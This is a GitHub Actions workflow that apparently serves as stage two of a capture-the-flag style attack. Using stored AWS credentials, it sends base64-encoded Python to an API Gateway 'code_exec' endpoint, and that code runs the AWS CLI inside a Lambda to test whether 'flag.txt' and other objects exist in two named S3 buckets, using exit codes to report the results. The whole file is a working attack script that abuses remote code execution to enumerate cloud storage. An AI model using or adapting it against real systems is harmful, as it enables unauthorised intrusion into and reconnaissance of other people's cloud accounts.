name: Stage2-AWSCLI-Probe

on:
  push:
    branches:
      - corgi

permissions:
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest

    env:
      AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
      AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
      AWS_SESSION_TOKEN: ${{ secrets.AWS_SESSION_TOKEN }}
      AWS_DEFAULT_REGION: us-east-1
      API_URL: https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec

    steps:
      - name: Install dependencies
        run: |
          python3 -m pip install requests requests-aws4auth --quiet

      - name: Probe AWS CLI inside Lambda
        run: |
          python3 - <<'PY'
          import os
          import base64
          import requests
          from requests_aws4auth import AWS4Auth

          api = os.environ["API_URL"]

          auth = AWS4Auth(
              os.environ["AWS_ACCESS_KEY_ID"],
              os.environ["AWS_SECRET_ACCESS_KEY"],
              "us-east-1",
              "execute-api",
              session_token=os.environ["AWS_SESSION_TOKEN"]
          )

          def invoke(bucket, key):
              code = f'''
          import subprocess

          command = [
              "/opt/aws",
              "s3api",
              "head-object",
              "--bucket",
              {bucket!r},
              "--key",
              {key!r},
              "--endpoint-url",
              "https://s3.us-east-1.amazonaws.com"
          ]

          result = subprocess.run(
              command,
              stdout=subprocess.PIPE,
              stderr=subprocess.PIPE
          )

          if result.returncode == 0:
              raise SystemExit(7)

          if b"AccessDenied" in result.stderr or b"Forbidden" in result.stderr:
              raise SystemExit(10)

          if b"NoSuchKey" in result.stderr or b"Not Found" in result.stderr:
              raise SystemExit(12)

          raise SystemExit(19)
          '''

              encoded = base64.b64encode(code.encode()).decode()

              response = requests.post(
                  api,
                  json={"code": encoded},
                  auth=auth,
                  timeout=40
              )

              print(f"BUCKET={bucket} KEY={key}")
              print(response.text)
              print("---")

          tests = [
              ("userad88e2b168aa387e", "flag.txt"),
              ("userad88e2b168aa387e", "index.html"),
              ("userad88e2b168aa387e", "docs.html"),
              ("userad88e2b168aa387e", "junior_developer.png"),
              ("logad88e2b168aa387e", "flag.txt"),
              ("logad88e2b168aa387e", "index.html"),
              ("logad88e2b168aa387e", "docs.html")
          ]

          for bucket, key in tests:
              invoke(bucket, key)
          PY
